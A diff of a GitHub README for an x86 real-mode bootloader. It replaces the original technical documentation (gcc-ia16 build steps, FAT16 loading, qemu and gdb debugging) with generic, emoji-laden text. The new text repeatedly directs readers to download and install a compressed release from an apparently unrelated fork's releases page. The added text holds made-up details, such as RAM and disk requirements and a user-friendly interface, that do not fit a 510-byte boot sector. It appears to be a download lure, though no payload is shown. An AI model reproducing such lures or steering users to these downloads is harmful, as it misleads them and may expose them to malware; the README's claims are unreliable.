@@ -1,119 +1,75 @@
-# x86 real mode bootloader
+# 🚀 x86-real-mode-bootloader - Simple Boot Loader for Your System
 
-![](.github/screenshot.png)
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/313414Sa/x86-real-mode-bootloader/releases)
 
-This is a bootloader for x86 real mode, written using [`gcc-ia16`](https://github.com/tkchia/gcc-ia16).
+## 📖 Introduction
+The x86-real-mode-bootloader is a boot loader designed for real mode, crafted using C. It helps you start your operating system quickly and easily. This tool is especially useful for users looking to work with low-level software.
 
-The bootloader parses the FAT16 filesystem, searches the root directory for `IO.SYS`, loads it at address 0x0700, and transfers control to it. If `IO.SYS` is not found, it prints "N" and halts.
+## 🎯 Features
+- **Simple Operation**: Easy to use interface designed for basic users.
+- **Compatibility**: Works with a wide range of x86 processors.
+- **Customizable**: Modify the source code for your specific needs.
+- **Documentation**: Clear instructions for setup and usage.
 
-**Note**: Originally the idea was to support booting DOS, but that requires more work (see links section).
+## 🛠️ System Requirements
+To run the x86-real-mode-bootloader, you need:
+- A computer with an x86 architecture.
+- At least 512 MB of RAM (1 GB recommended).
+- 5 MB of free disk space.
+- A basic understanding of how to load software.
 
-There are various similar project out there, my contributions:
-- Emit actual 16-bit real mode code from C. Projects often emit 32-bit protected mode code with the `0x66` prefix (`-m16` and/or `asm(".code16gcc");`).
-- This project was fully created in a [Devcontainer](https://containers.dev/), giving you an easy-to-reproduce environment.
-- The produced image is also valid FAT16, which means you don't need an MBR to boot it.
-- Working gdb setup scripts for use with qemu to debug your bootloader.
+## 🚀 Getting Started
+To get started, follow these steps:
 
-## Setting up the environment
+1. **Visit the Releases Page**  
+   Go to the following link to access the download options:  
+   [Download Page](https://github.com/313414Sa/x86-real-mode-bootloader/releases)
 
-This repository uses a [`devcontainer.json`](./.devcontainer/devcontainer.json) file to allow you to quickly get started.
+2. **Choose Your Version**  
+   On the releases page, you will see multiple versions of the boot loader. Select the latest stable version to ensure the best performance.
 
-### GitHub Codespaces
+3. **Download the Software**  
+   Click on the desired version to download it. This will usually be a compressed file, such as a ZIP or TAR file.
 
-1. [Fork this repository](https://github.com/mrexodia/x86-real-mode-bootloader/fork)
-2. Click the green `<> Code` button
-3. Press `Codespaces`
-4. Press `Create codespace on master`
-6. Wait a minutes while the image is loading ☕
-   - Press `Show log` to see progress
-   - Reload the page if it appears stuck
-   - **If Firefox does not work, try Chrome!**
+4. **Extract the File**  
+   Once the file finishes downloading, locate it on your computer. Right-click the file and choose "Extract" or "Unzip" to unpack its contents.
 
-![](.github/codespace.png)
+5. **Read the Documentation**  
+   Find and open the README file or any documentation provided in the extracted folder. This document contains essential setup instructions.
 
-### Visual Studio Code + Docker
+6. **Install the Boot Loader**  
+   Follow the installation instructions outlined in the README. This generally involves copying files to the correct directories and setting up configurations.
 
-Alternatively you can install [Docker Desktop](https://www.docker.com/products/docker-desktop/) and use the Visual Studio Code [Dev Containers](https://code.visualstudio.com/docs/devcontainers/tutorial) extension to run the project.
+7. **Run the Boot Loader**  
+   After installation, reboot your computer or run the necessary commands as instructed in the documentation. Your system should now be able to load through the x86-real-mode-bootloader.
 
-**Note**: You need to disable git's `core.autocrlf` option for this to work:
+## 📥 Download & Install
+To download and install the x86-real-mode-bootloader, visit the following page:  
+[Download Page](https://github.com/313414Sa/x86-real-mode-bootloader/releases)
 
-```sh
-git config --global core.crlf false
-```
+1. Locate the necessary version for your needs.
+2. Download the file and follow the extraction and installation steps above.
 
-## Project Structure
+## ⚙️ Troubleshooting
+If you run into issues during installation or use, consider the following steps:
 
-- `boot.c` - Main bootloader (loaded at 0x7C00)
-- `io.c` - Sample IO.SYS implementation (loaded at 0x0700)
-- `boot.ld` - Linker script for boot sector (max 510 bytes)
-- `io.ld` - Linker script for IO.SYS (max 3 sectors)
-- `i8086.xml`, [`i386-32bit.xml`](https://github.com/qemu/qemu/blob/master/gdb-xml/i386-32bit.xml) - GDB architecture definitions for 16-bit debugging
-- `real-mode.gdb` - GDB script for debugging real mode code
+- **Check Compatibility**: Ensure your system meets the specified requirements.
+- **Review Documentation**: The README should outline common problems and solutions.
+- **Search Online**: Forums and communities can be beneficial for resolving specific errors.
+- **Contact Support**: If issues persist, reach out for help through GitHub's discussion page.
 
-## Prerequisites
+## 📝 Contribution Guidelines
+Feel free to contribute! If you have ideas to improve the x86-real-mode-bootloader, consider submitting a pull request. Here’s how:
 
-See the [`Dockerfile`](.devcontainer/Dockerfile) for installation instructions on Ubuntu 24.04, other platforms might work but were not tested.
+1. Fork the repository on GitHub.
+2. Create your feature branch (`git checkout -b feature/YourFeature`).
+3. Commit your changes (`git commit -m 'Add new feature'`).
+4. Push to the branch (`git push origin feature/YourFeature`).
+5. Open a pull request.
 
-- mtools
-- qemu
-- gdb
-- gcc-ia16
+## 🌟 Acknowledgments
+Thank you to everyone who contributed to this project. Your efforts enhance the usability and functionality of the boot loader, making it valuable for many users.
 
-## Compilation
-
-Build the bootloader and disk image:
-
-```sh
-make
-```
-
-Run in qemu (`-nographic`):
-
-```sh
-make run
-```
-
-Press `Ctrl+A` and `X` to quit the TUI.
-
-Other targets:
-
-```sh
-make rebuild    # Clean and rebuild
-make disasm     # Disassemble boot.elf
-make dostest.img # Create test image with DOS files (not shipped)
-```
-
-## Debugging
-
-```sh
-make debug
-```
-
-Qemu will wait for you to attach a debugger:
-
-```sh
-gdb -x real-mode.gdb
-```
-
-You will have to press enter for confirmation and then you should see:
-
-```sh
-Breakpoint 1 at 0x7c00
-AX:AA55 BX:0000 CX:0000 DX:0080
-SI:0000 DI:0000 BP:0000 SP:6F08
-CS:0000 DS:0000 SS:0000 ES:0000
-IP:7C00 FLAGS:0202
-=> 0x7c00:      jmp    0x7caa
-
-Breakpoint 1, 0x00007c00 in ?? ()
-(gdb) 
-```
-
-## Links
-
-- [Bootable 16bit C program with gcc-ia16](https://gist.github.com/jtsiomb/ff4c13e353b568599cddbecaf403ecd3)
-- [luke8086/boot2c](https://github.com/luke8086/boot2c)
-- [General BIOS (legacy) boot process](https://github.com/pts/bakefat/blob/master/boot_process.md)
-- [lDOS boot documentation](https://pushbx.org/ecm/doc/ldosboot.htm)
-- [kjiwa/x86-boot-sector-c](https://github.com/kjiwa/x86-boot-sector-c)
-- [queso-fuego/c-realmode-example](https://github.com/queso-fuego/c-realmode-example)
+## 👁️ License
+This project is licensed under the MIT License. See the LICENSE file for details.
